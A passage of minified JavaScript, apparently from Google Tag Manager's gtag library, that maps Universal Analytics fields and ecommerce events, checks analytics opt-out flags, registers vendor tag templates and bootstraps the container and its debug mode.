    bw = Object.freeze((aw.anonymize_ip = 1, aw.fatal = 1, aw.send_page_view = 1, aw.store_gac = 1, aw.use_amp_client_id = 1, aw[K.g.ya] = 1, aw[K.g.gh] = 1, aw)),
    Gv = function (a, b, c, d) {
      if (void 0 !== c) if (bw[b] && (c = Ea(c)), "anonymize_ip" !== b || c || (c = void 0), 1 === a) d[uv(b)] = c;else if (g(a)) d[a] = c;else for (var e in a) a.hasOwnProperty(e) && void 0 !== c[e] && (d[a[e]] = c[e]);
    },
    uv = function (a) {
      return a && g(a) ? a.replace(/(_[a-z])/g, function (b) {
        return b[1].toUpperCase();
      }) : a;
    },
    cw = {},
    Iv = Object.freeze((cw.checkout_progress = 1, cw.select_content = 1, cw.set_checkout_option = 1, cw[K.g.Wb] = 1, cw[K.g.Xb] = 1, cw[K.g.Eb] = 1, cw[K.g.Yb] = 1, cw[K.g.Ta] = 1, cw[K.g.hb] = 1, cw[K.g.Ua] = 1, cw[K.g.ka] = 1, cw[K.g.Zb] = 1, cw[K.g.xa] = 1, cw)),
    dw = {},
    ew = Object.freeze((dw.checkout_progress = 1, dw.set_checkout_option = 1, dw[K.g.Cg] = 1, dw[K.g.Dg] = 1, dw[K.g.Wb] = 1, dw[K.g.Xb] = 1, dw[K.g.Eg] = 1, dw[K.g.Eb] = 1, dw[K.g.ka] = 1, dw[K.g.Zb] = 1, dw[K.g.Fg] = 1, dw)),
    fw = {},
    gw = Object.freeze((fw.generate_lead = 1, fw.login = 1, fw.search = 1, fw.select_content = 1, fw.share = 1, fw.sign_up = 1, fw.view_search_results = 1, fw[K.g.Yb] = 1, fw[K.g.Ta] = 1, fw[K.g.hb] = 1, fw[K.g.Ua] = 1, fw[K.g.xa] = 1, fw)),
    hw = function (a) {
      var b = "general";
      ew[a] ? b = "ecommerce" : gw[a] ? b = "engagement" : "exception" === a && (b = "error");
      return b;
    },
    iw = {},
    jw = Object.freeze((iw.view_search_results = 1, iw[K.g.Ta] = 1, iw[K.g.Ua] = 1, iw[K.g.xa] = 1, iw)),
    Cv = function (a, b, c) {
      a.hasOwnProperty(b) || (a[b] = c);
    },
    kw = function (a) {
      if (va(a)) {
        for (var b = [], c = 0; c < a.length; c++) {
          var d = a[c];
          if (void 0 != d) {
            var e = d.id,
              f = d.variant;
            void 0 != e && void 0 != f && b.push(String(e) + "." + String(f));
          }
        }
        return 0 < b.length ? b.join("!") : void 0;
      }
    },
    yv = function (a, b, c) {
      var d = function (M) {
          return T(c, M);
        },
        e = {},
        f = {},
        h = {},
        l = {},
        m = kw(d(K.g.wj));
      !c.isGtmEvent && m && Cv(f, "exp", m);
      h["&gtm"] = Xi(!0);
      c.isGtmEvent || (h._no_slc = !0);
      Of() && (l._cs = Ov);
      var n = d(K.g.Jc);
      if (!c.isGtmEvent && ic(n)) for (var p in n) if (n.hasOwnProperty(p) && /^(dimension|metric)\d+$/.test(p) && void 0 != n[p]) {
        var q = d(String(n[p]));
        void 0 !== q && Cv(f, p, q);
      }
      for (var r = !c.isGtmEvent, t = Zg(c), u = 0; u < t.length; ++u) {
        var v = t[u];
        if (c.isGtmEvent) {
          var w = d(v);
          Zv.hasOwnProperty(v) ? e[v] = w : Uv.hasOwnProperty(v) ? l[v] = w : h[v] = w;
        } else {
          var x = void 0;
          x = v !== K.g.W ? d(v) : $g(c, v);
          if (Yv.hasOwnProperty(v)) Gv(Yv[v], v, x, e);else if (Vv.hasOwnProperty(v)) Gv(Vv[v], v, x, h);else if (tv.hasOwnProperty(v)) Gv(tv[v], v, x, f);else if (sv.hasOwnProperty(v)) Gv(sv[v], v, x, l);else if (/^(dimension|metric|content_group)\d+$/.test(v)) Gv(1, v, x, f);else if (v === K.g.W) {
            if (!Pv) {
              var y = Sa(x);
              y && (f["&did"] = y);
            }
            var A = void 0,
              B = void 0;
            b === K.g.la ? A = Sa($g(c, v), ".") : (A = Sa($g(c, v, 1), "."), B = Sa($g(c, v, 2), "."));
            A && (f["&gdid"] = A);
            B && (f["&edid"] = B);
          } else v === K.g.Ja && 0 > t.indexOf(K.g.fc) && (l.cookieName = x + "_ga");
          P(44) && Rv[v] && (c.C.hasOwnProperty(v) || b === K.g.la && c.h.hasOwnProperty(v)) && (r = !1);
        }
      }
      P(44) && r && (f["&jsscut"] = "1");
      !1 !== d(K.g.ef) && !1 !== d(K.g.jb) && qv() || (h.allowAdFeatures = !1);
      ni(c) && rv() ? P(54) && (h.allowAdPersonalizationSignals = !0) : h.allowAdPersonalizationSignals = !1;
      !c.isGtmEvent && d(K.g.vb) && (l._useUp = !0);
      if (c.isGtmEvent) {
        l.name = l.name || e.gtmTrackerName;
        var C = h.hitCallback;
        h.hitCallback = function () {
          ta(C) && C();
          c.onSuccess();
        };
      } else {
        Cv(l, "cookieDomain", "auto");
        Cv(h, "forceSSL", !0);
        Cv(e, "eventCategory", hw(b));
        jw[b] && Cv(f, "nonInteraction", !0);
        "login" === b || "sign_up" === b || "share" === b ? Cv(e, "eventLabel", d(K.g.fh)) : "search" === b || "view_search_results" === b ? Cv(e, "eventLabel", d(K.g.Gj)) : "select_content" === b && Cv(e, "eventLabel", d(K.g.nj));
        var I = e[K.g.za] || {},
          E = I[K.g.jc];
        E || 0 != E && I[K.g.O] ? l.allowLinker = !0 : !1 === E && Cv(l, "useAmpClientId", !1);
        f.hitCallback = c.onSuccess;
        l.name = a;
      }
      Of() && (h["&gcs"] = oi(), P(50) && (h["&gcd"] = si(c)), Q(K.g.N) || (l.storage = "none"), Q(K.g.F) || (h.allowAdFeatures = !1, l.storeGac = !1));
      P(52) && (wi() && (h["&dma_cps"] = ti()), h["&dma"] = vi());
      var F = Ap(c) || d(K.g.Hb),
        L = d(K.g.ee);
      F && (c.isGtmEvent || (l[K.g.Hb] = F), l._cd2l = !0);
      L && !c.isGtmEvent && (l[K.g.ee] = L);
      e.fieldsToSend = f;
      e.fieldsToSet = h;
      e.createOnlyFields = l;
      return e;
    },
    Dv = function (a) {
      var b = a.gtmEcommerceData;
      if (!b) return null;
      var c = {};
      b.currencyCode && (c.Mf = b.currencyCode);
      if (b.impressions) {
        c.action = "impressions";
        var d = b.impressions;
        c.di = "impressions" === b.translateIfKeyEquals ? Nv(d) : d;
      }
      if (b.promoView) {
        c.action = "promo_view";
        var e = b.promoView.promotions;
        c.Kd = "promoView" === b.translateIfKeyEquals ? Nv(e) : e;
      }
      if (b.promoClick) {
        c.action = "promo_click";
        var f = b.promoClick.promotions;
        c.Kd = "promoClick" === b.translateIfKeyEquals ? Nv(f) : f;
        c.Qa = b.promoClick.actionField;
        return c;
      }
      for (var h in b) if (b.hasOwnProperty(h) && "translateIfKeyEquals" !== h && "impressions" !== h && "promoView" !== h && "promoClick" !== h && "currencyCode" !== h) {
        c.action = h;
        var l = b[h].products;
        c.Rb = "products" === b.translateIfKeyEquals ? Nv(l) : l;
        c.Qa = b[h].actionField;
        break;
      }
      return Object.keys(c).length ? c : null;
    },
    Ev = function (a, b) {
      function c(u) {
        return {
          id: d(K.g.qa),
          affiliation: d(K.g.Jg),
          revenue: d(K.g.aa),
          tax: d(K.g.kf),
          shipping: d(K.g.Mc),
          coupon: d(K.g.Kg),
          list: d(K.g.jf) || d(K.g.Lc) || u
        };
      }
      for (var d = function (u) {
          return T(b, u);
        }, e = d(K.g.T), f, h = 0; e && h < e.length && !(f = e[h][K.g.jf] || e[h][K.g.Lc]); h++);
      var l = d(K.g.Jc);
      if (ic(l)) for (var m = 0; e && m < e.length; ++m) {
        var n = e[m],
          p;
        for (p in l) l.hasOwnProperty(p) && /^(dimension|metric)\d+$/.test(p) && void 0 != l[p] && Cv(n, p, n[l[p]]);
      }
      var q = null,
        r = d(K.g.rj);
      if (a === K.g.ka || a === K.g.Zb) q = {
        action: a,
        Qa: c(),
        Rb: Nv(e)
      };else if (a === K.g.Wb) q = {
        action: "add",
        Qa: c(),
        Rb: Nv(e)
      };else if (a === K.g.Xb) q = {
        action: "remove",
        Qa: c(),
        Rb: Nv(e)
      };else if (a === K.g.xa) q = {
        action: "detail",
        Qa: c(f),
        Rb: Nv(e)
      };else if (a === K.g.Ta) q = {
        action: "impressions",
        di: Nv(e)
      };else if (a === K.g.Ua) q = {
        action: "promo_view",
        Kd: Nv(r) || Nv(e)
      };else if ("select_content" === a && r && 0 < r.length || a === K.g.hb) q = {
        action: "promo_click",
        Kd: Nv(r) || Nv(e)
      };else if ("select_content" === a || a === K.g.Yb) q = {
        action: "click",
        Qa: {
          list: d(K.g.jf) || d(K.g.Lc) || f
        },
        Rb: Nv(e)
      };else if (a === K.g.Eb || "checkout_progress" === a) {
        var t = {
          step: a === K.g.Eb ? 1 : d(K.g.hf),
          option: d(K.g.Xd)
        };
        q = {
          action: "checkout",
          Rb: Nv(e),
          Qa: H(c(), t)
        };
      } else "set_checkout_option" === a && (q = {
        action: "checkout_option",
        Qa: {
          step: d(K.g.hf),
          option: d(K.g.Xd)
        }
      });
      q && (q.Mf = d(K.g.na));
      return q;
    },
    lw = {},
    zv = function (a, b) {
      var c = lw[a];
      lw[a] = H(b);
      if (!c) return !1;
      for (var d in b) if (b.hasOwnProperty(d) && b[d] !== c[d]) return !0;
      for (var e in c) if (c.hasOwnProperty(e) && c[e] !== b[e]) return !0;
      return !1;
    };
  wf();
  function ww() {
    return z.gaGlobal = z.gaGlobal || {};
  }
  var xw = function () {
      var a = ww();
      a.hid = a.hid || ya();
      return a.hid;
    },
    yw = function (a, b) {
      var c = ww();
      if (void 0 == c.vid || b && !c.from_cookie) c.vid = a, c.from_cookie = b;
    };
  var vx = /^(www\.)?google(\.com?)?(\.[a-z]{2}t?)?$/,
    wx = /^www.googleadservices.com$/;
  var xx = window,
    yx = document,
    zx = function (a) {
      var b = xx._gaUserPrefs;
      if (b && b.ioo && b.ioo() || yx.documentElement.hasAttribute("data-google-analytics-opt-out") || a && !0 === xx["ga-disable-" + a]) return !0;
      try {
        var c = xx.external;
        if (c && c._gaUserPrefs && "oo" == c._gaUserPrefs) return !0;
      } catch (f) {}
      for (var d = yi("AMP_TOKEN", String(yx.cookie), !0), e = 0; e < d.length; e++) if ("$OPT_OUT" == d[e]) return !0;
      return yx.getElementById("__gaOptOutExtension") ? !0 : !1;
    };
  function Hx(a) {
    k(a, function (c) {
      "_" === c.charAt(0) && delete a[c];
    });
    var b = a[K.g.La] || {};
    k(b, function (c) {
      "_" === c.charAt(0) && delete b[c];
    });
  }
  ;
  var Qx = function (a, b) {};
  function Px(a, b) {
    var c = function () {};
    return c;
  }
  function Rx(a, b, c) {}
  ;
  var Sx = Px;
  var Tx = function (a, b, c) {
    for (var d = 0; d < b.length; d++) a.hasOwnProperty(b[d]) && (a[b[d]] = c(a[b[d]]));
  };
  Object.freeze({
    dl: 1,
    id: 1
  });
  Object.freeze(["config", "event", "get", "set"]);
  var Ux = encodeURI,
    W = encodeURIComponent,
    Vx = function (a, b, c) {
      Tb(a, b, c);
    },
    Wx = function (a, b) {
      if (!a) return !1;
      var c = sj(uj(a), "host");
      if (!c) return !1;
      for (var d = 0; b && d < b.length; d++) {
        var e = b[d] && b[d].toLowerCase();
        if (e) {
          var f = c.length - e.length;
          0 < f && "." != e.charAt(0) && (f--, e = "." + e);
          if (0 <= f && c.indexOf(e, f) == f) return !0;
        }
      }
      return !1;
    },
    Xx = function (a, b, c) {
      for (var d = {}, e = !1, f = 0; a && f < a.length; f++) a[f] && a[f].hasOwnProperty(b) && a[f].hasOwnProperty(c) && (d[a[f][b]] = a[f][c], e = !0);
      return e ? d : null;
    };
  var X = {
    m: {}
  };
  X.m.c = ["google"], function () {
    (function (a) {
      X.__c = a;
      X.__c.o = "c";
      X.__c.isVendorTemplate = !0;
      X.__c.priorityOverride = 0;
      X.__c.isInfrastructure = !1;
      X.__c.runInSiloedMode = !0;
    })(function (a) {
      mu(a.vtp_value, "c", a.vtp_gtmEventId);
      return a.vtp_value;
    });
  }();
  X.m.e = ["google"], function () {
    (function (a) {
      X.__e = a;
      X.__e.o = "e";
      X.__e.isVendorTemplate = !0;
      X.__e.priorityOverride = 0;
      X.__e.isInfrastructure = !1;
      X.__e.runInSiloedMode = !0;
    })(function (a) {
      return String(a.vtp_gtmCachedValues.event);
    });
  }();
  X.m.v = ["google"], function () {
    (function (a) {
      X.__v = a;
      X.__v.o = "v";
      X.__v.isVendorTemplate = !0;
      X.__v.priorityOverride = 0;
      X.__v.isInfrastructure = !1;
      X.__v.runInSiloedMode = !1;
    })(function (a) {
      var b = a.vtp_name;
      if (!b || !b.replace) return !1;
      var c = eu(b.replace(/\\\./g, "."), a.vtp_dataLayerVersion || 1),
        d = void 0 !== c ? c : a.vtp_defaultValue;
      mu(d, "v", a.vtp_gtmEventId);
      return d;
    });
  }();
  X.m.rep = ["google"], function () {
    (function (a) {
      X.__rep = a;
      X.__rep.o = "rep";
      X.__rep.isVendorTemplate = !0;
      X.__rep.priorityOverride = 0;
      X.__rep.isInfrastructure = !1;
      X.__rep.runInSiloedMode = !0;
    })(function (a) {
      var b = sg(a.vtp_containerId),
        c = el(b, !0),
        d;
      switch (c.prefix) {
        case "AW":
          d = Qu;
          break;
        case "DC":
          d = bv;
          break;
        case "GF":
          d = hv;
          break;
        case "HA":
          d = mv;
          break;
        case "UA":
          d = Lv;
          break;
        case "MC":
          d = Sx(c, a.vtp_gtmEventId);
          break;
        default:
          G(a.vtp_gtmOnFailure);
          return;
      }
      if (d) {
        G(a.vtp_gtmOnSuccess);
        var e = d,
          f = el(og(b), !0);
        f && Pr.register(f, e);
        if (a.vtp_remoteConfig) {
          var h = a.vtp_remoteConfig || {},
            l = el(og(b), !0);
          l && Yr(l, h);
        }
      } else G(a.vtp_gtmOnFailure);
    });
  }();
  X.m.get = ["google"], function () {
    (function (a) {
      X.__get = a;
      X.__get.o = "get";
      X.__get.isVendorTemplate = !0;
      X.__get.priorityOverride = 0;
      X.__get.isInfrastructure = !1;
      X.__get.runInSiloedMode = !1;
    })(function (a) {
      var b = a.vtp_settings,
        c = b.eventParameters || {},
        d = String(a.vtp_eventName),
        e = {};
      e.eventId = a.vtp_gtmEventId;
      e.priorityId = a.vtp_gtmPriorityId;
      a.vtp_deferrable && (e.deferrable = !0);
      var f = mr(String(b.streamId), d, c);
      pr(f, e.eventId, e);
      a.vtp_gtmOnSuccess();
    });
  }();
  X.m.zone = [], function () {
    var a = {},
      b = function (c) {
        for (var d = 0; d < c.length; d++) if (!c[d]) return !1;
        return !0;
      };
    (function (c) {
      X.__zone = c;
      X.__zone.o = "zone";
      X.__zone.isVendorTemplate = !0;
      X.__zone.priorityOverride = 0;
      X.__zone.isInfrastructure = !1;
      X.__zone.runInSiloedMode = !1;
    })(function (c) {
      var d = b(c.vtp_boundaries || []);
      if (c.vtp_gtmTagId in a) yr(a[c.vtp_gtmTagId], c.vtp_gtmEventId, d);else if (d) {
        var e = c.vtp_childContainers.map(function (m) {
            return m.publicId;
          }),
          f = c.vtp_enableTypeRestrictions ? c.vtp_whitelistedTypes.map(function (m) {
            return m.typeId;
          }) : null,
          h = {};
        var l = xr(c.vtp_gtmEventId, e, f, h, Wp(c.vtp_gtmEntityIndex, c.vtp_gtmEntityName), !!c.vtp_inheritParentConfig);
        a[c.vtp_gtmTagId] = l;
      }
      G(c.vtp_gtmOnSuccess);
    });
  }();
  var sz = {};
  sz.dataLayer = af;
  sz.callback = function (a) {
    Re.hasOwnProperty(a) && ta(Re[a]) && Re[a]();
    delete Re[a];
  };
  sz.bootstrap = 0;
  sz._spx = !1;
  function tz() {
    Ae[pg()] = Ae[pg()] || sz;
    vg();
    zg() || k(Ag(), function (a, b) {
      Dp(a, b.transportUrl, b.context);
      J(92);
    });
    Ma(Se, X.m);
    Zc = jd;
  }
  (function (a) {
    function b() {
      m = D.documentElement.getAttribute("data-tag-assistant-present");
      at(m) && (l = h.Ij);
    }
    if (!z["__TAGGY_INSTALLED"]) {
      var c = !1;
      if (D.referrer) {
        var d = uj(D.referrer);
        c = "cct.google" === rj(d, "host");
      }
      if (!c) {
        var e = Ci("googTaggyReferrer");
        c = e.length && e[0].length;
      }
      c && (z["__TAGGY_INSTALLED"] = !0, Qb("https://cct.google/taggy/agent.js"));
    }
    if (Me) a();else {
      var f = function (u) {
          var v = "GTM",
            w = "GTM";
          Ge ? (v = "OGT", w = "GTAG") : Me && (w = v = "OPT");
          var x = z["google.tagmanager.debugui2.queue"];
          x || (x = [], z["google.tagmanager.debugui2.queue"] = x, Qb("https://" + ze.Pd + "/debug/bootstrap?id=" + jg.ctid + "&src=" + w + "&cond=" + u + "&gtm=" + Xi()));
          var y = {
            messageType: "CONTAINER_STARTING",
            data: {
              scriptSource: Kb,
              containerProduct: v,
              debug: !1,
              id: jg.ctid,
              destinations: mg()
            }
          };
          y.data.resume = function () {
            a();
          };
          ze.Ji && (y.data.initialPublish = !0);
          x.push(y);
        },
        h = {
          dm: 1,
          Jj: 2,
          Uj: 3,
          Li: 4,
          Ij: 5
        },
        l = void 0,
        m = void 0,
        n = sj(z.location, "query", !1, void 0, "gtm_debug");
      at(n) && (l = h.Jj);
      if (!l && D.referrer) {
        var p = uj(D.referrer);
        "tagassistant.google.com" === rj(p, "host") && (l = h.Uj);
      }
      if (!l) {
        var q = Ci("__TAG_ASSISTANT");
        q.length && q[0].length && (l = h.Li);
      }
      l || b();
      if (!l && bt(m)) {
        var r = function () {
            if (t) return !0;
            t = !0;
            b();
            l && Kb ? f(l) : a();
          },
          t = !1;
        Ub(D, "TADebugSignal", function () {
          r();
        }, !1);
        z.setTimeout(function () {
          r();
        }, 200);
      } else l && Kb ? f(l) : a();
    }
  })(function () {
    try {
      tg();
      if (P(30)) {}
      Bf().B();
      ei();
      var b = qg();
      if (eg().canonical[b]) {
        var c = Ae.zones;
        c && c.unregisterChild(lg());
      } else {
        xp();
        for (var d = data.resource || {}, e = d.macros || [], f = 0; f < e.length; f++) Oc.push(e[f]);
        for (var h = d.tags || [], l = 0; l < h.length; l++) Rc.push(h[l]);
        for (var m = d.predicates || [], n = 0; n < m.length; n++) Qc.push(m[n]);
        for (var p = d.rules || [], q = 0; q < p.length; q++) {
          for (var r = p[q], t = {}, u = 0; u < r.length; u++) {
            var v = r[u][0];
            t[v] = Array.prototype.slice.call(r[u], 1);
            Mc(5) || Mc(7) ? ("if" !== v && "unless" !== v || Yc(t[v]), ab("TAGGING", 22)) : Mc(6) && ab("TAGGING", 23);
          }
          Pc.push(t);
        }
        Tc = X;
        Uc = Lu;
        tz();
        if (P(46)) {
          for (var w = pf["7"], x = w ? w.split("|") : [], y = {}, A = 0; A < x.length; A++) y[x[A]] = !0;
          for (var B = 0; B < Wf.length; B++) {
            var C = Wf[B],
              I = y[C] ? "granted" : "denied";
            Gf().implicit(C, I);
          }
        }
        $s();
        Qp = !1;
        Rp = 0;
        if ("interactive" == D.readyState && !D.createEventObject || "complete" == D.readyState) Tp();else {
          Ub(D, "DOMContentLoaded", Tp);
          Ub(D, "readystatechange", Tp);
          if (D.createEventObject && D.documentElement.doScroll) {
            var E = !0;
            try {
              E = !z.frameElement;
            } catch (O) {}
            E && Up();
          }
          Ub(z, "load", Tp);
        }
        ps = !1;
        "complete" === D.readyState ? rs() : Ub(z, "load", rs);
        Jg && (Eg(Wg), z.setInterval(Vg, 864E5));
        Eg(Nu);
        Eg(Tq);
        Eg(Yn);
        Eg(Or);
        Eg(dr);
        Eg(Ip);
        Eg(Zi);
        Eg(Gp);
        Eg($q);
        P(58) && Eg(Wq);
        wt();
        of(1);
        Ar();
        Qe = Ja();
        sz.bootstrap = Qe;
        if (P(30)) {}
      }
    } catch (O) {
      if (of(4), Jg) {
        var R = Qg(!0, !0);
        Tb(R);
      }
    }
  });
})();